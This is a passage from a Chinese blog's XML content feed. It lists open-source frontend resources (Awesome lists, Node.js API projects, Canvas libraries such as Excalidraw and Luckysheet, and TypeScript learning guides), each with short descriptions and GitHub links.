href="https://github.com/Solido/awesome-flutter">https://github.com/Solido/awesome-flutter</a><br /><strong>●Awesome Rust：</strong><a href="https://github.com/rust-unofficial/awesome-rust">https://github.com/rust-unofficial/awesome-rust</a><br /><strong>●Awesome Next.js：</strong><a href="https://github.com/unicodeveloper/awesome-nextjs">https://github.com/unicodeveloper/awesome-nextjs</a><br /><strong>●Awesome Nuxt.js：</strong><a href="https://github.com/nuxt-community/awesome-nuxt">https://github.com/nuxt-community/awesome-nuxt</a><br /><strong>●Awesome NestJS：</strong><a href="https://github.com/nestjs/awesome-nestjs">https://github.com/nestjs/awesome-nestjs</a><br /><strong>●Awesome Web Security：</strong><a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a><br /><strong>●Awesome Font ：</strong><a href="https://github.com/FortAwesome/Font-Awesome">https://github.com/FortAwesome/Font-Awesome</a><br /><strong>●Awesome Mac：</strong><a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Awesome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js项目</title>
      <link href="/2023/06/30/frontend/collection/projects/node.js-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/node.js-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>网易云音乐 API</strong><br />一个基于 Node.js 的网易云音乐 API 服务。通过该项目，开发者可以方便地对网易云音乐进行各种操作，例如搜索歌曲、获取歌曲信息和评论、获取用户信息和播放列表等等。该项目提供了完整的文档供开发者参考，提供了超过 250 个接口。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602765518-64b49734-267c-4a6c-8c7f-a1ac8811bb91.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602765518-64b49734-267c-4a6c-8c7f-a1ac8811bb91.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/Binaryify/NeteaseCloudMusicApi">https://github.com/Binaryify/NeteaseCloudMusicApi</a><br /><strong>饿了么 API</strong><br />一个基于 Node.js + MongoDB + Express + Mongoose + Vue + Element UI 的前后端分离的 Web 应用项目，是一个仿照饿了么的外卖点餐系统。整个项目分为两部分：前台项目接口、后台管理接口，共 60 多个。涉及登陆、注册、添加商品、商品展示、筛选排序、购物车、下单、用户中心等，构成一个完整的流程。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603001637-bedb862b-3bd5-493b-8d23-ccb449d4a753.png?x-oss-process=image/resize,w_427,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603001637-bedb862b-3bd5-493b-8d23-ccb449d4a753.png?x-oss-process=image/resize,w_427,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/bailicangdu/node-elm">https://github.com/bailicangdu/node-elm</a><br /><strong>QQ 音乐 API</strong><br />基于 Express + Axios 的 QQ 音乐接口 nodejs 版，开发者可以方便地对 QQ 音乐进行各种操作，例如搜索歌曲、获取歌曲信息和评论、获取用户信息和播放列表等。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603140212-81db8baa-28b4-4591-8b6f-26eb56f99cd4.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603140212-81db8baa-28b4-4591-8b6f-26eb56f99cd4.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/jsososo/QQMusicApi">https://github.com/jsososo/QQMusicApi</a><br /><strong>Spotify API</strong><br />一个可以运行在 Node.JS 和浏览器上的 Spotify Web API 通用封装库&#x2F;客户端，使用了 browserify&#x2F;webpack&#x2F;rollup 进行打包。该项目提供了音乐数据、音乐简介、搜索、播放列表操作、音乐库、个性化、浏览、播放器、跟随、身份验证等功能 API。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603425777-d2e71696-0b99-4ff5-9269-9fcaddcc4a26.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603425777-d2e71696-0b99-4ff5-9269-9fcaddcc4a26.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/thelinmichael/spotify-web-api-node">https://github.com/thelinmichael/spotify-web-api-node</a><br /><strong>ChatGPT API</strong><br />一个基于 OpenAI 的 ChatGPT 生成式对话模型的 Web API。该项目使用 TypeScript 和 Express.js 构建。通过该项目，开发者可以快速地搭建自己的聊天机器人，以及实现其他基于 ChatGPT 的自然语言处理应用。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603768502-65bd5ace-5f72-4656-b6ed-ca407858887a.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603768502-65bd5ace-5f72-4656-b6ed-ca407858887a.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/transitive-bullshit/chatgpt-api">https://github.com/transitive-bullshit/chatgpt-api</a><br /><strong>SpaceX REST API</strong><br />一个开源的 SpaceX 公司的 RESTful API，该项目提供了关于 SpaceX 发射、船只、火箭、任务等各种数据的接口。该项目的目的是为开发者提供 SpaceX 公司的数据，方便开发者进行相关应用的开发。同时，该项目还提供了文档和使用示例，方便开发者快速上手使用。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603892902-44c35db0-e8eb-45c3-9cfd-af86eb164893.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682603892902-44c35db0-e8eb-45c3-9cfd-af86eb164893.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/r-spacex/SpaceX-API">https://github.com/r-spacex/SpaceX-API</a><br /><strong>Node.js 最佳实践</strong><br />Node.js 最佳实践指南，旨在帮助开发者编写更加健壮、安全和易于维护的 Node.js 应用程序。它提供了一系列的最佳实践、原则和代码示例，涵盖了从工程结构、代码组织、错误处理和日志记录等方面的内容。</p><p>该项目通过将最佳实践分类为 8 个模块，为开发者提供了一个全面的指南，帮助编写高质量的 Node.js 代码。这些模块包括：<br />● 项目结构实践 <br />● 异常处理实践 <br />● 编码规范实践 <br />● 测试和总体质量实践<br />● 进入生产实践<br />● 安全实践<br />● 性能实践<br />●Docker 实践</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602036272-eff507f4-e8bc-4528-a611-331eb2fb7768.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602036272-eff507f4-e8bc-4528-a611-331eb2fb7768.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/goldbergyoni/nodebestpractices">https://github.com/goldbergyoni/nodebestpractices</a><br /><strong>Node.js 调试指南</strong><br />一个面向 Node.js 调试的开源项目，旨在帮助开发者更好地理解和利用 Node.js 的调试工具。该项目提供了一组示例代码和指南，覆盖了 Node.js 内置的调试器、Chrome DevTools 和 VSCode 等常见的调试工具。</p><p>通过学习该项目，开发者可以了解 Node.js 调试器的基本用法，包括如何使用 –inspect 命令行参数启动 Node.js 应用程序，以及如何使用 Chrome DevTools 或者 VSCode 连接到 Node.js 调试会话。项目还提供了一些进阶内容，例如如何使用调试器进行内存分析和 CPU 分析等。</p><p>此外，该项目中的示例代码非常实用，包含了许多调试场景下的代码示例，例如如何在调试过程中打断点、如何使用条件断点、如何在调试期间修改变量值、如何跟踪异步代码等。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602236591-9ba6f8a8-80c8-4eb2-b661-127f78f35f47.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602236591-9ba6f8a8-80c8-4eb2-b661-127f78f35f47.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/nswbmw/node-in-debugging">https://github.com/nswbmw/node-in-debugging</a><br /><strong>Nodejs-Roadmap</strong><br />一个社区驱动的学习资源，旨在帮助开发者系统学习成为现代化的 Node.js 开发者。通过该项目，开发者可以获得一份完整的学习路线图，学习从基础到进阶的全部内容。该路线图覆盖了从 Node.js 基础知识、模块和包管理、异步编程和事件循环、Web 开发、网络协议和安全、性能和可伸缩性等方面的内容。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602529228-fa1716a4-5ece-4b35-b0fa-397b8b1985ba.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682602529228-fa1716a4-5ece-4b35-b0fa-397b8b1985ba.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/kamranahmedse/developer-roadmap">https://github.com/kamranahmedse/developer-roadmap</a><br /><strong>Awesome Node.js</strong><br />一个开源的收录 Node.js 生态系统各种资源的项目，其中包括了 Node.js 框架、库、工具、文档和文章等各个方面，是一个非常受欢迎和权威的 Node.js 资源收集项目。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682604002719-4d16a332-45d4-4e59-ad9f-60d2252fe304.png?x-oss-process=image/resize,w_667,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1682604002719-4d16a332-45d4-4e59-ad9f-60d2252fe304.png?x-oss-process=image/resize,w_667,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canvas 项目</title>
      <link href="/2023/06/30/frontend/collection/projects/canvas-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/canvas-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在 Web 开发中，Canvas 是一个强大的绘图工具，可以实现各种有趣的交互效果和动态图形。本文将盘点 10 个基于 Canvas 的开源项目，旨在为提供开发灵感和思路，以便更好地探索并应用 Canvas 技术！<br><a name="ADI2i"></a></p><h2 id="canvas-editor"><a href="#canvas-editor" class="headerlink" title="canvas-editor"></a>canvas-editor</h2><p>canvas-editor 是一个基于 canvas&#x2F;svg 的富文本编辑器，类似于 word。其具有以下特点：<br />● <strong>所见即所得</strong>：类 word 可分页，所见即所得<br />● <strong>轻量的数据结构</strong>：一段 JSON 即可呈现复杂样式<br />● <strong>丰富的功能</strong>：支持常见富文本操作、表格、水印、控件、公式等<br />● <strong>使用方便</strong>：官方发布核心 npm 包，菜单栏、工具栏可自行维护<br />● <strong>灵活的开发机制</strong>：通过接口可获取生命周期、事件回调、自定义右键菜单、快捷键等<br />● <strong>完全类型化的 API</strong>：灵活的 API 和完整的 TypeScript 类型</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685498254941-735fbf63-0239-4806-ad5a-cd0ec03fd688.png?x-oss-process=image/resize,w_950,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685498254941-735fbf63-0239-4806-ad5a-cd0ec03fd688.png?x-oss-process=image/resize,w_950,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/Hufe921/canvas-editor">https://github.com/Hufe921/canvas-editor</a><br><a name="aGqGo"></a></p><h2 id="lucky-canvas"><a href="#lucky-canvas" class="headerlink" title="lucky-canvas"></a><br />lucky-canvas</h2><p>基于 TS + Canvas 开发的【大转盘 &#x2F; 九宫格 &#x2F; 老虎机】抽奖插件，一套源码适配多端框架 JS &#x2F; Vue &#x2F; React &#x2F; Taro &#x2F; UniApp &#x2F; 微信小程序等，奖品 &#x2F; 文字 &#x2F; 图片 &#x2F; 颜色 &#x2F; 按钮均可配置，支持同步 &#x2F; 异步抽奖，概率前 &#x2F; 后端可控，自动根据 dpr 调整清晰度适配移动端。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685435064284-5b2b7963-649b-4dee-b4d9-29dc00e8f722.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685435064284-5b2b7963-649b-4dee-b4d9-29dc00e8f722.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="nEfQY"></a></p><h2 id="Excalidraw"><a href="#Excalidraw" class="headerlink" title="Excalidraw"></a><br />Excalidraw</h2><p>Excalidraw 是一款开源的在线白板工具，主要用于创建简单直观的图形和草图，支持共享和协作。以下是 Excalidraw 的主要特点：<br />● 简单易用：具有直观简单的界面和操作方式，用户可以轻松创建和编辑图形，并实现各种设计需求。<br />● 实时协作：支持多人实时协作，用户可以与其他人一起编辑和讨论，在线完成协作任务。<br />● 自由绘制和对象管理：提供了自由绘制、文本框、箭头、线段、矩形、椭圆、图标等多种基本对象，并支持对这些对象进行移动、复制、旋转、缩放、对齐等操作，帮助用户实现更为精细的设计。<br />● 高度灵活性：支持导出为 SVG、PNG、Clipboard 等多种格式，方便用户进行分享和保存。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685435218432-2da00b0b-cb03-48c0-9106-80f4b2b9b485.png?x-oss-process=image/resize,w_721,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685435218432-2da00b0b-cb03-48c0-9106-80f4b2b9b485.png?x-oss-process=image/resize,w_721,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="sK2Uj"></a></p><h2 id="fireworks-js"><a href="#fireworks-js" class="headerlink" title="fireworks-js"></a><br />fireworks-js</h2><p>fireworks-js 是一个基于 Canvas 的动画库，用于在网页上制作烟花特效。该库的特点如下：<br />● 轻量级：fireworks-js 体积小，不依赖其他库或框架，易于集成。<br />● 易于使用：只需几行代码就可以创建出炫目的烟花特效，具有良好的可定制性和可扩展性。<br />● 动画效果逼真：fireworks-js 采用粒子系统实现烟花特效，能够模拟出逼真的爆炸、飞溅和星光等效果。<br />● 浏览器兼容性良好：可以在主流的现代浏览器上运行，支持多种设备和分辨率，包括移动端。</p><p>该项目提供了多种框架的实现：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434066197-1c6d1514-ceb7-4bb8-8283-b84125b9d648.png?x-oss-process=image/resize,w_485,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434066197-1c6d1514-ceb7-4bb8-8283-b84125b9d648.png?x-oss-process=image/resize,w_485,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="NmWJk"></a></p><h2 id="Luckysheet"><a href="#Luckysheet" class="headerlink" title="Luckysheet"></a><br />Luckysheet</h2><p>Luckysheet ，一款纯前端基于 Canvas 的类似 excel 的在线表格，功能强大、配置简单、完全开源。其具有以下功能：<br />● <strong>格式</strong>：样式、条件格式、文本对齐和旋转、文本截断、溢出、自动换行、多种数据类型、单元格分割样式<br />● <strong>单元格</strong>：拖放、填充柄、多选、查找和替换、定位、合并单元格、数据验证<br />● <strong>行和列</strong>：隐藏、插入、删除行或列、冻结和拆分文本<br />● <strong>操作</strong>：撤消、重做、复制、粘贴、剪切、热键、格式刷、拖放选择<br />● <strong>公式和函数</strong>：内置、远程和自定义公式<br />● <strong>表</strong>：过滤、排序<br />● <strong>增强功能</strong>：数据透视表、图表、评论、协同编辑、插入图片、矩阵计算、截图、复制为其他格式、EXCEL 导入导出等。<br /><img src="https://cdn.nlark.com/yuque/0/2023/gif/1500604/1685434303162-7e2ad244-39f9-4036-b47f-8d657bd4b98a.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/gif/1500604/1685434303162-7e2ad244-39f9-4036-b47f-8d657bd4b98a.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="xYJi1"></a></p><h2 id="x-spreadsheet"><a href="#x-spreadsheet" class="headerlink" title="x-spreadsheet"></a><br />x-spreadsheet</h2><p>x-spreadsheet 是一个基于 Web(es6) canvas 构建的轻量级 Excel 开发库。其具有以下特点：<br />● 轻量级：完整功能，包含所有插件。代码打包后只不到 200kb<br />● 易于使用：如果只需要一些简单的功能可以零配置<br />● 数据驱动：调整数据非常的简单快捷<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434452541-55b294dc-ddef-490f-80d5-7af56a3054f7.png?x-oss-process=image/resize,w_868,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434452541-55b294dc-ddef-490f-80d5-7af56a3054f7.png?x-oss-process=image/resize,w_868,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="hNb4E"></a></p><h2 id="rough"><a href="#rough" class="headerlink" title="rough"></a><br />rough</h2><p>Rough.js 是一个轻量级的（大约 8k），基于 Canvas 的可以绘制出粗略的手绘风格的图形库。该库提供绘制线条、曲线、弧线、多边形、圆形和椭圆的基础能力，同时支持绘制 SVG 路径。除此之外，Rough.js 还提供了大量的可自定义选项，可以调整线宽、线条颜色、填充颜色、字体样式、背景颜色等，以使图形更加个性化。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434512240-51c1a587-a1ae-4418-8a38-11f3d24d1866.png?x-oss-process=image/resize,w_370,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434512240-51c1a587-a1ae-4418-8a38-11f3d24d1866.png?x-oss-process=image/resize,w_370,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="zwuGz"></a></p><h2 id="Signature-Pad"><a href="#Signature-Pad" class="headerlink" title="Signature Pad"></a><br />Signature Pad</h2><p>Signature Pad 是一个基于 Canvas 实现的签名库，用于绘制签名。它可以在所有现代桌面和移动浏览器中使用，不依赖于任何外部库。Signature Pad 提供了许多可自定义的选项，如笔画颜色、粗细、背景色、画布大小、签名格式等，可以轻松实现不同的签名风格和功能。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434734272-60b5604b-6f5f-4b86-978f-48bf3bb3c5ea.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434734272-60b5604b-6f5f-4b86-978f-48bf3bb3c5ea.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="QyqzP"></a></p><h2 id="canvas-confetti"><a href="#canvas-confetti" class="headerlink" title="canvas-confetti"></a><br />canvas-confetti</h2><p>canvas-confetti 是一个基于 Canvas 的库，用于在 Web 页面中实现炫酷的彩色纸屑动画效果。它实现了高性能、流畅的纸屑动画效果，同时兼容各种现代浏览器。提供了许多可自定义的选项，如纸屑颜色、形状、数量、速度、角度、发射器位置等，可以轻松实现不同的纸屑效果。并支持多种触发方式，如点击按钮、滚动页面、定时触发等，可根据需求进行定制。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434982733-7eff5cb4-96ae-4542-8fb9-47c7d9619fc4.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685434982733-7eff5cb4-96ae-4542-8fb9-47c7d9619fc4.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="EXjTj"></a></p><h2 id="QRCanvas"><a href="#QRCanvas" class="headerlink" title="QRCanvas"></a><br />QRCanvas</h2><p>QRCanvas 是一个基于 canvas 的 JavaScript 二维码生成工具。其具有以下特点：<br />● 仅依赖 canvas，兼容性好<br />● 简单，仅仅是需要一些数据的配置<br />● 定制化功能丰富<br />● 支持 Node.js<br />● 方便在 React 和 Vue 中使用<br />● 支持所有主流的浏览器<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685435772506-ae1f373c-735c-4efe-8daf-f44a915b79de.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1685435772506-ae1f373c-735c-4efe-8daf-f44a915b79de.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript资源</title>
      <link href="/2023/06/30/frontend/collection/projects/typescript-zi-yuan/"/>
      <url>/2023/06/30/frontend/collection/projects/typescript-zi-yuan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>1. TypeScript 官方文档</strong><br />TypeScript 官方文档，提供了中文版本。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664442631327-8350ba70-300f-4cd2-96ba-56c1b3f60865.png?x-oss-process=image/resize,w_952,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664442631327-8350ba70-300f-4cd2-96ba-56c1b3f60865.png?x-oss-process=image/resize,w_952,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/microsoft/TypeScript">https://github.com/microsoft/TypeScript</a><br /><strong>2. 学习 TypeScript</strong><br />可能是中国最好的 TypeScript 入门到进阶系统教程。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664445286344-12e51bd3-9fa2-4d12-bad3-bb8d7c5d9815.png?x-oss-process=image/resize,w_953,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664445286344-12e51bd3-9fa2-4d12-bad3-bb8d7c5d9815.png?x-oss-process=image/resize,w_953,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/mqyqingfeng/learn-typescript">https://github.com/mqyqingfeng/learn-typescript</a><br /><strong>3. TypeScript 使用指南手册</strong><br />TypeScript 使用手册（中文版）翻译。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443280883-eac9817d-5d6f-4709-9edd-08350e2288dc.png?x-oss-process=image/resize,w_943,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443280883-eac9817d-5d6f-4709-9edd-08350e2288dc.png?x-oss-process=image/resize,w_943,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/zhongsp/TypeScript">https://github.com/zhongsp/TypeScript</a><br /><strong>4. 深入理解 TypeScript</strong><br />TypeScript Deep Dive 中文版。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443336206-fff9533f-b544-4a83-adc4-c5df6588d71e.png?x-oss-process=image/resize,w_881,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443336206-fff9533f-b544-4a83-adc4-c5df6588d71e.png?x-oss-process=image/resize,w_881,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/jkchao/typescript-book-chinese">https://github.com/jkchao/typescript-book-chinese</a><br /><strong>5. TypeScript 入门教程</strong><br />从 JavaScript 程序员的角度总结思考，循序渐进的理解 TypeScript。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664444113373-16b2f5e8-a6a2-4058-a1ee-13d5b2a1f346.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664444113373-16b2f5e8-a6a2-4058-a1ee-13d5b2a1f346.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/xcatliu/typescript-tutorial">https://github.com/xcatliu/typescript-tutorial</a><br /><strong>6. TypeScript 类型挑战</strong><br />高质量的类型可以提高项目的可维护性并避免一些潜在的漏洞。本项目意在于让你更好的了解 TS 的类型系统，编写你自己的类型工具，或者只是单纯的享受挑战的乐趣！</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443405827-d4016c2b-48e4-4dd5-bf8f-0662c2bbf943.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443405827-d4016c2b-48e4-4dd5-bf8f-0662c2bbf943.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/type-challenges/type-challenges">https://github.com/type-challenges/type-challenges</a><br /><strong>7. DefinitelyTyped</strong><br />DefinitelyTyped 包含大量的高质量的 TypeScript 类型定义。通过使用 DefinitelyTyped 及其包含的声明文件，我们可以使用大多数流行的 JavaScript 库，就像它们是 TypeScript 库一样，将通过编译器进行类型验证。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443177881-2031d286-07ec-4cdc-a26a-ed70917413ab.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443177881-2031d286-07ec-4cdc-a26a-ed70917413ab.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/DefinitelyTyped/DefinitelyTyped">https://github.com/DefinitelyTyped/DefinitelyTyped</a><br /><strong>8. react-redux-typescript-guide</strong><br />本指南记录了有关在 React（及其生态系统）中以函数式风格使用 TypeScript 的模式和秘诀。它将使代码类型安全，同时专注于从实现中推断类型，从长远来看更容易编写和维护正确的类型。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443626158-f28e8f34-c652-48f3-8559-a75e799c8060.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443626158-f28e8f34-c652-48f3-8559-a75e799c8060.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/piotrwitek/react-redux-typescript-guide">https://github.com/piotrwitek/react-redux-typescript-guide</a><br /><strong>9. React+TypeScript 备忘录</strong><br />专注于帮助 React 开发人员在 React 应用中使用 TypeScript。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443735038-9f6569f0-3926-43f9-8ded-774ba62e6000.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664443735038-9f6569f0-3926-43f9-8ded-774ba62e6000.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/typescript-cheatsheets/react">https://github.com/typescript-cheatsheets/react</a><br /><strong>10. clean-code-typescript</strong><br />将 Clean Code 的概念适用到 TypeScript，引导读者使用 TypeScript 